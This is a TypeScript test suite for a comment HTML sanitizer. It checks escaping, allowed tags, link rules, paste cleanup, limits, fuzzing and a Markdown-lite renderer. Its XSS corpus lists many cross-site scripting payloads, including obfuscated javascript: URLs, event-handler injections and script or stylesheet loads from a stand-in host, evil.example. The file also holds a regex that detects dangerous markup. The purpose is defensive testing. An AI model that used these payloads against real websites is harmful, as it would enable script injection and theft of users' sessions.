// The comment sanitizer is the trust boundary: an XSS corpus, paste samples, structure and limits, idempotence, a seeded fuzz, plainText and Markdown-lite.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { sanitize, plainText, safeHref, MAX_BODY, tooLong } from '../core/rich-text.ts';
import { commentHtml } from '../core/rich-text-md.ts';

/** An independent check of an output: only the allowed tags, only the allowed attributes in their exact form, no '<' or '>' or bare '&' in text. */
const TAG = /^<(?:\/?(?:p|b|strong|i|em|s|del|strike|u|ul|ol|li|table|thead|tbody|tr|span|code|pre|blockquote|th|td|a)|br|(?:td|th)(?: (?:colspan|rowspan)="(?:[2-9]|1\d|20)")+|span class="cc-(?:coral|ochre|sage|cyan|sky|violet)"|a href="https?:\/\/[^"<>\s]+" rel="noopener noreferrer" target="_blank")>$/;
function valid(out: string) {
  const parts = out.split(/(<[^>]*>)/);
  for (let i = 0; i < parts.length; i++) {
    if (i % 2) assert.match(parts[i], TAG, `bad tag ${parts[i]} in ${out}`);
    else { assert.ok(!/[<>]/.test(parts[i]), `raw char in text: ${parts[i]}`); assert.ok(!/&(?!(?:amp|lt|gt);)/.test(parts[i]), `bare & in ${parts[i]}`); }
  }
  const depth = [...out.matchAll(/<(\/?)([a-z]+)/g)].reduce((d, m) => { const n = d.n + (m[1] ? -1 : m[2] === 'br' ? 0 : 1); return { n, max: Math.max(d.max, n) }; }, { n: 0, max: 0 });
  assert.equal(depth.n, 0, `unbalanced: ${out}`);
  assert.ok(depth.max <= 20, 'too deep');
}
const clean = (x: string) => { const o = sanitize(x); valid(o); assert.equal(sanitize(o), o, `not idempotent: ${x}`); return o; };

const XSS = [
  '<script>alert(1)</script>', '<SCRIPT SRC=//evil.example/x.js></SCRIPT>', '<script>alert(1)', '<scr<script>ipt>alert(1)</scr</script>ipt>', '<script\n>alert(1)</script\n>',
  '<img src=x onerror=alert(1)>', '<img src="x" onerror="alert(1)">', '<IMG SRC=javascript:alert(1)>', '<svg onload=alert(1)>', '<svg><script>alert(1)</script></svg>', '<svg/onload=alert(1)>',
  '<math><mi xlink:href="javascript:alert(1)">x</mi></math>', '<body onload=alert(1)>', '<iframe src="javascript:alert(1)"></iframe>', '<iframe srcdoc="<script>alert(1)</script>">',
  '<object data="javascript:alert(1)"></object>', '<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">', '<form action="javascript:alert(1)"><button>x</button></form>',
  '<input autofocus onfocus=alert(1)>', '<details open ontoggle=alert(1)>', '<video><source onerror=alert(1)>', '<marquee onstart=alert(1)>', '<link rel=stylesheet href=//evil.example/x.css>',
  '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">', '<base href="javascript:alert(1)//">', '<style>@import "//evil.example/x.css"</style>', '<style>*{background:url(javascript:alert(1))}</style>',
  '<p style="background:url(javascript:alert(1))">x</p>', '<p style="position:fixed;top:0;left:0;width:100%;height:100%">x</p>', '<b style=x:expression(alert(1))>x</b>', '<p onclick="alert(1)">x</p>', '<p onmouseover=alert(1)>x</p>',
  '<a href="javascript:alert(1)">x</a>', '<a href="JaVaScRiPt:alert(1)">x</a>', '<a href="  javascript:alert(1)">x</a>', '<a href="java\nscript:alert(1)">x</a>', '<a href="java\tscript:alert(1)">x</a>', '<a href="&#106;avascript:alert(1)">x</a>',
  '<a href="&#x6A;avascript:alert(1)">x</a>', '<a href="&#0000106avascript:alert(1)">x</a>', '<a href="javascript&colon;alert(1)">x</a>', '<a href="javascript&#58;alert(1)">x</a>', '<a href="\u0001javascript:alert(1)">x</a>',
  '<a href="data:text/html,<script>alert(1)</script>">x</a>', '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>', '<a href="vbscript:msgbox(1)">x</a>', '<a href="mailto:a@b.c">x</a>', '<a href="//evil.example">x</a>',
  '<a href="/relative">x</a>', '<a href="file:///etc/passwd">x</a>', '<a href=javascript:alert(1)>x</a>', "<a href='javascript:alert(1)'>x</a>", '<a href="https://ok.example" onclick="alert(1)" target="_self" rel="opener">x</a>',
  '<a href="https://ok.example/"onmouseover="alert(1)">x</a>', '<a href="https://ok.example/" title=\'"><script>alert(1)</script>\'>x</a>', '<a href="https://x.example/?q=\'"><img src=x onerror=alert(1)>">x</a>',
  '<a href=https://a.example/`onmouseover=alert(1)>x</a>', '<a\nhref="javascript:alert(1)">x</a>', '<a/href="javascript:alert(1)">x</a>',
  '<!--><script>alert(1)</script>-->', '<!-- <script>alert(1)</script> -->x', '<!--[if gte mso 9]><script>alert(1)</script><![endif]-->', '<![CDATA[<script>alert(1)</script>]]>', '<?xml version="1.0"?><script>alert(1)</script>',
  '<!DOCTYPE html><script>alert(1)</script>', '<<script>alert(1)//<</script>', '<<img src=x onerror=alert(1)>', '<img src=x onerror=alert(1)//', '<a href="https://x.example" <script>alert(1)</script>>x</a>',
  '&lt;script&gt;alert(1)&lt;/script&gt;', '&#60;script&#62;alert(1)&#60;/script&#62;', '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;', '&amp;lt;script&amp;gt;', '<p>&lt;img src=x onerror=alert(1)&gt;</p>',
  '<textarea><script>alert(1)</script></textarea>', '<title><script>alert(1)</script></title>', '<noscript><p title="</noscript><script>alert(1)</script>">', '<template><script>alert(1)</script></template>', '<xmp><script>alert(1)</script></xmp>',
  '<select><option><script>alert(1)</script></select>', '<table><tr><td><script>alert(1)</script></td></tr></table>', '<p><b><script>alert(1)</script></b></p>', '<span class="cc-coral" onclick=alert(1)>x</span>',
  '<span class="cc-coral" style="x">x</span>', '<span class="x cc-coral y">x</span>', '<span class="cc-coral&quot; onmouseover=&quot;alert(1)">x</span>', '<span class="cc-coral"onclick=alert(1)>x</span>', '<td colspan="2 onclick=alert(1)">x</td>',
  '<table><tr><td colspan="99999999999">x</td><td rowspan="-1">y</td><td colspan="abc">z</td></tr></table>', '<scrİpt>alert(1)</scrİpt>', '<Keygen onfocus=alert(1)>', '<ſcript>alert(1)</ſcript>',
  '<s\u0000cript>alert(1)</s\u0000cript>', '<p\u0000 onclick=alert(1)>x</p>', 'java\u0000script:alert(1)', '<a href="https://x.example/‮evil">x</a>', '‮abc<script>alert(1)</script>',
  '<img """><script>alert(1)</script>">', '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>', "<a href=\"x\" onmouseover=\"alert('XSS')\">x</a>", '<div style="width:expression(alert(1))">x</div>',
  '<svg><animate onbegin=alert(1) attributeName=x dur=1s>', '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>', '<isindex action=javascript:alert(1) type=image>', '<bgsound src=javascript:alert(1)>', '<keygen autofocus onfocus=alert(1)>',
  '<p>a</p><script>alert(1)</script><p>b</p>', '<a href="https://x.example"><script>alert(1)</script></a>', 'x<!--', 'x<', '<', '<>', '</>', '<//>', '<a', '<a href="', "<a href='x", '</a', '<p', '</p', '<!', '<!-', '<!--x', '<![if !supportLists]>x<![endif]>',
];
const DANGER = /<script|<img|<svg|<iframe|<style|javascript:|vbscript:|data:|onerror|onload|onclick|onmouse|onfocus|expression|<form|<input|<body|<meta|<link|<base|<object|<embed/i;

test('XSS corpus: every output is canonical, balanced, idempotent and free of live markup', () => {
  for (const x of XSS) {
    const o = clean(x);
    // anything dangerous that is left can only be escaped text, never a tag or an attribute
    const live = o.replace(/&lt;[^]*?(?:&gt;|$)/g, '');
    assert.ok(!/<(?:script|img|svg|iframe|style|form|input|body|meta|link|base|object|embed)/i.test(live), `live tag in ${JSON.stringify(o)} from ${JSON.stringify(x)}`);
    assert.ok(!/\son[a-z]+\s*=|href="(?!https?:\/\/)|style=/i.test(o.replace(/&lt;[^]*?&gt;/g, '')), `live attribute in ${JSON.stringify(o)} from ${JSON.stringify(x)}`);
  }
});

test('script and style never leave their contents behind', () => {
  assert.equal(clean('a<script>alert(1)</script>b'), 'ab');
  assert.equal(clean('a<style>p{color:red}</style>b'), 'ab');
  assert.equal(clean('a<SCRIPT >alert(1)</SCRIPT >b'), 'ab');
  assert.equal(clean('a<script>alert(1)'), 'a');
  assert.equal(clean('<iframe src=x>hidden</iframe>shown'), 'shown');
  assert.equal(clean('a<!-- hidden -->b'), 'ab');
  assert.equal(clean('a<!--[if gte mso 9]><xml><o:x/></xml><![endif]-->b'), 'ab');
});

test('<scr<script>ipt> and friends stay text', () => {
  assert.equal(clean('<scr<script>ipt>alert(1)</scr</script>ipt>'), 'ipt&gt;alert(1)ipt&gt;');
  assert.equal(clean('<<script>script>alert(1)<</script>/script>'), '&lt;/script&gt;');
});

test('URLs: only http(s) survive, decoded the way a browser reads them', () => {
  assert.equal(safeHref('https://a.example/x?y=1&z=2'), 'https://a.example/x?y=1&z=2');
  assert.equal(safeHref(' HTTP://a.example '), 'HTTP://a.example');
  assert.equal(safeHref('ht\ntp://a.example'), 'http://a.example');
  for (const bad of ['javascript:alert(1)', ' javascript:alert(1)', 'JaVaScRiPt:alert(1)', 'data:text/html,x', 'vbscript:x', 'mailto:a@b.c', '//a.example', '/x', 'x', 'https://', 'http:// ', 'https:/a', 'file:///x', '\u0001javascript:x', 'https:a.example']) assert.equal(safeHref(bad), null, bad);
  const o = clean('<a href="https://a.example/p?q=1&r=2" onclick=x>go</a>');
  assert.equal(o, '<a href="https://a.example/p?q=1&amp;r=2" rel="noopener noreferrer" target="_blank">go</a>');
  assert.equal(clean('<a href="javascript:alert(1)">text stays</a>'), 'text stays');
  assert.equal(clean('<a href="&#106;avascript:alert(1)">t</a>'), 't');
  assert.equal(clean('<a href="&amp;#106;avascript:alert(1)">t</a>'), 't');
  assert.equal(clean('<a href="https://a.example/&quot;onmouseover=&quot;x">t</a>'), '<a href="https://a.example/&quot;onmouseover=&quot;x" rel="noopener noreferrer" target="_blank">t</a>');
  assert.equal(clean('<a href="https://a.example"><a href="https://b.example">in</a></a>'), '<a href="https://a.example" rel="noopener noreferrer" target="_blank">in</a>');
});

test('what is kept: formatting, lists, links, colour classes, table spans', () => {
  assert.equal(clean('<p>a <b>b</b> <strong>c</strong> <i>d</i> <em>e</em> <s>f</s> <del>g</del> <strike>h</strike> <u>i</u> <code>j</code></p>'), '<p>a <b>b</b> <strong>c</strong> <i>d</i> <em>e</em> <s>f</s> <del>g</del> <strike>h</strike> <u>i</u> <code>j</code></p>');
  assert.equal(clean('<ul><li>a</li><li>b<ol><li>c</li></ol></li></ul>'), '<ul><li>a</li><li>b<ol><li>c</li></ol></li></ul>');
  assert.equal(clean('<blockquote>q</blockquote><pre>x\n  y</pre>'), '<blockquote>q</blockquote><pre>x\n  y</pre>');
  for (const c of ['coral', 'ochre', 'sage', 'cyan', 'sky', 'violet']) assert.equal(clean(`<span class="cc-${c}">x</span>`), `<span class="cc-${c}">x</span>`);
  assert.equal(clean('<span class="cc-red">x</span><span class="color:red">y</span><span>z</span>'), 'xyz');
  assert.equal(clean('<table><thead><tr><th colspan="2">h</th></tr></thead><tbody><tr><td rowspan="3">a</td><td colspan="1">b</td></tr></tbody></table>'), '<table><thead><tr><th colspan="2">h</th></tr></thead><tbody><tr><td rowspan="3">a</td><td>b</td></tr></tbody></table>');
  assert.equal(clean('<table><tr><td colspan="21">x</td><td colspan="99999999999">y</td><td rowspan="-1">z</td><td colspan="abc">w</td></tr></table>'), '<table><tr><td>x</td><td>y</td><td>z</td><td>w</td></tr></table>');
  assert.equal(clean('line<br>two<br/>three'), 'line<br>two<br>three');
});

test('text is escaped and entities are decoded once', () => {
  assert.equal(clean('1 < 2 & 3 > 2'), '1 &lt; 2 &amp; 3 &gt; 2');
  assert.equal(clean('&lt;b&gt;not bold&lt;/b&gt;'), '&lt;b&gt;not bold&lt;/b&gt;');
  assert.equal(clean('&amp;lt;'), '&amp;lt;');
  assert.equal(clean('&nbsp;a&copy;&#65;&#x42;'), 'a&amp;copy;AB');
  assert.equal(clean('a\u0000b‮c‏d'), 'abcd');
  assert.equal(clean('&#0;&#xD800;&#1114112;x'), 'x');
  assert.equal(clean(''), '');
  assert.equal(sanitize(undefined as any), '');
  assert.equal(sanitize(42 as any), '');
});

test('structure: implied ends, orphans, nesting, unclosed input', () => {
  assert.equal(clean('<ul><li>a<li>b</ul>'), '<ul><li>a</li><li>b</li></ul>');
  assert.equal(clean('<li>orphan</li>'), 'orphan');
  assert.equal(clean('<td>orphan</td>'), 'orphan');
  assert.equal(clean('<table><tr><td>1<td>2<tr><td>3</table>'), '<table><tr><td>1</td><td>2</td></tr><tr><td>3</td></tr></table>');
  assert.equal(clean('<table>loose<tr>text<td>x</td></tr></table>'), '<table><tr><td>x</td></tr></table>');
  assert.equal(clean('<ul>loose<li>x</li></ul>'), '<ul><li>x</li></ul>');
  assert.equal(clean('<p>a<p>b'), '<p>a</p><p>b</p>');
  assert.equal(clean('<p>a<ul><li>b</li></ul>'), '<p>a</p><ul><li>b</li></ul>');
  assert.equal(clean('<b>a<i>b</b>c</i>'), '<b>a<i>b</i></b>c');
  assert.equal(clean('</b></p></td>x'), 'x');
  assert.equal(clean('<b><table><tr><td>x</b>y</td></tr></table>z</b>'), '<b><table><tr><td>xy</td></tr></table>z</b>');
  assert.equal(clean('<b>bold <i>both'), '<b>bold <i>both</i></b>');
  assert.equal(clean('<div>one</div><div>two</div><h2>H</h2>'), '<p>one</p><p>two</p><p>H</p>');
  assert.equal(clean('<table><tr><td><table><tr><td>in</td></tr></table></td></tr></table>'), '<table><tr><td><table><tr><td>in</td></tr></table></td></tr></table>');
});

test('limits: depth 20, table 50 x 20, body length, input size', () => {
  const deep = '<blockquote>'.repeat(40) + 'x' + '</blockquote>'.repeat(40);
  const o = clean(deep);
  assert.equal((o.match(/<blockquote>/g) ?? []).length, 20);
  assert.ok(o.includes('x'));
  const rows = (n: number, c: number) => '<table>' + Array.from({ length: n }, (_, r) => '<tr>' + Array.from({ length: c }, (_, k) => `<td>${r},${k}</td>`).join('') + '</tr>').join('') + '</table>';
  const big = clean(rows(60, 30));
  assert.equal((big.match(/<tr>/g) ?? []).length, 50);
  assert.equal((big.match(/<td>/g) ?? []).length, 50 * 20);
  assert.ok(!big.includes('50,0') && !big.includes('0,20'));
  assert.ok(clean(rows(50, 20)).includes('49,19'));
  assert.equal(tooLong('x'.repeat(MAX_BODY)), null);
  assert.ok(tooLong('x'.repeat(MAX_BODY + 1)));
  const t0 = Date.now();
  const huge = sanitize('<b>'.repeat(300000));
  assert.ok(huge.length > 0 && Date.now() - t0 < 3000, 'input is bounded and fast');
  assert.ok(sanitize('x'.repeat(2e6)).length <= 400000);
});

test('paste samples: Word, Confluence, web page, Google Docs', () => {
  const word = '<html xmlns:o="urn:schemas-microsoft-com:office:office"><head><meta charset=utf-8><style><!-- p.MsoNormal{margin:0} --></style><!--[if gte mso 9]><xml><o:OfficeDocumentSettings/></xml><![endif]--></head><body lang=EN-US style="tab-interval:36.0pt"><!--StartFragment-->'
    + '<p class=MsoNormal style="margin:0cm"><b style="mso-bidi-font-weight:normal"><span style="font-size:12.0pt;font-family:Calibri">Title</span></b><o:p></o:p></p>'
    + '<![if !supportLists]><span style="mso-list:Ignore">1.<span style="font:7.0pt Times">&nbsp;&nbsp;</span></span><![endif]>'
    + '<p class=MsoListParagraph style="margin-left:36.0pt;text-indent:-18.0pt;mso-list:l0 level1 lfo1"><span lang=EN-US>item</span></p><!--EndFragment--></body></html>';
  assert.equal(clean(word), '<p><b>Title</b></p>1.  <p>item</p>');
  const conf = '<div class="table-wrap"><table class="confluenceTable"><colgroup><col width="10%"><col></colgroup><tbody><tr><th class="confluenceTh" style="background:#f0f0f0">Field</th><th class="confluenceTh">Src</th></tr>'
    + '<tr><td class="confluenceTd"><span class="nobr"><a href="https://wiki.example/x" class="external-link" rel="nofollow">x</a></span></td><td class="confluenceTd">y<br class="atl-forced-newline"></td></tr></tbody></table></div>';
  assert.equal(clean(conf), '<table><tbody><tr><th>Field</th><th>Src</th></tr><tr><td><a href="https://wiki.example/x" rel="noopener noreferrer" target="_blank">x</a></td><td>y<br></td></tr></tbody></table>');
  const web = '<meta charset="utf-8"><h1 id="x" class="title" onclick="a()">T</h1><p style="color:rgb(0,0,0);background:#fff"><font color="#ff0000">red</font> <mark>m</mark> <font face="Arial" size="3">f</font></p><ul style="list-style:disc"><li data-x="1"><div>a</div></li></ul>';
  assert.equal(clean(web), '<p>T</p><p>red m f</p><ul><li><p>a</p></li></ul>');
  const gdocs = '<b style="font-weight:normal;" id="docs-internal-guid-1"><p dir="ltr" style="line-height:1.38"><span style="font-size:11pt;color:#000000;font-weight:700">Bold</span></p></b>';
  assert.equal(clean(gdocs), '<b><p>Bold</p></b>');
});

test('fuzz: random fragments never break the output rules', () => {
  const frag = ['<', '>', '</', '/>', '<p>', '</p>', '<b>', '</b>', '<a href="https://a.example">', '<a href="javascript:x">', '</a>', '<ul>', '<li>', '</ul>', '<table>', '<tr>', '<td>', '<td colspan=2>', '</td>', '</table>', '<span class="cc-coral">', '</span>',
    '<script>', '</script>', '<!--', '-->', '&', '&amp;', '&#', '&lt;', '"', "'", '=', ' ', '\n', 'text', 'onerror=', '<img src=x onerror=1>', '<svg>', '<br>', '<style>', '<![CDATA[', ']]>', '\u0000', '<pre>', '</pre>', '<thead>', '<tbody>', '<th>', '<ol>', '<blockquote>'];
  let seed = 12345;
  const rnd = (n: number) => { seed = (seed * 1103515245 + 12345) & 0x7fffffff; return seed % n; };
  for (let k = 0; k < 4000; k++) {
    const x = Array.from({ length: 1 + rnd(30) }, () => frag[rnd(frag.length)]).join('');
    clean(x);
  }
  assert.ok(true);
  assert.ok(!DANGER.test(clean('<img src=x onerror=alert(1)>')));
});

test('plainText: block ends, lists, cells', () => {
  assert.equal(plainText('<p>One</p><p>Two <b>bold</b></p>'), 'One\nTwo bold');
  assert.equal(plainText('<ul><li>a</li><li>b</li></ul>'), '- a\n- b');
  assert.equal(plainText('<table><tr><th>F</th><th>S</th></tr><tr><td>x</td><td>y</td></tr></table>'), 'F | S\nx | y');
  assert.equal(plainText('a<br>b &lt;i&gt; &amp; <script>x</script>c'), 'a\nb <i> & c');
  assert.equal(plainText('<p>' + 'x'.repeat(10) + '</p>'), 'xxxxxxxxxx');
  assert.equal(plainText(''), '');
});

test('Markdown-lite for assistants: bold, strike, lists, paragraphs; HTML is sanitized; text is escaped', () => {
  assert.equal(commentHtml('Hello **world** and ~~old~~\nsame para\n\n- a\n- b\n\nlast'), '<p>Hello <strong>world</strong> and <s>old</s><br>same para</p><ul><li>a</li><li>b</li></ul><p>last</p>');
  assert.equal(commentHtml('1 < 2 & 3'), '<p>1 &lt; 2 &amp; 3</p>');
  assert.equal(commentHtml('<p>ok</p><script>alert(1)</script><img src=x onerror=alert(1)>'), '<p>ok</p>');
  assert.equal(commentHtml(''), '');
  assert.equal(commentHtml('**<script>alert(1)</script>**'), '<p><strong>&lt;script&gt;alert(1)&lt;/script&gt;</strong></p>');
});

test('Markdown-lite: only a tag the sanitizer knows makes the input HTML; other angle brackets are text', () => {
  assert.equal(commentHtml('Map<string, number> is slow'), '<p>Map&lt;string, number&gt; is slow</p>');
  assert.equal(commentHtml('<img src=x onerror=1> **b**'), '<p>&lt;img src=x onerror=1&gt; <strong>b</strong></p>');
  assert.equal(commentHtml('use <T> and List<Foo> here'), '<p>use &lt;T&gt; and List&lt;Foo&gt; here</p>');
  assert.equal(commentHtml('a <b>bold</b> word'), 'a <b>bold</b> word');
  assert.equal(commentHtml('<div>x</div><script>alert(1)</script>'), '<p>x</p>');
});
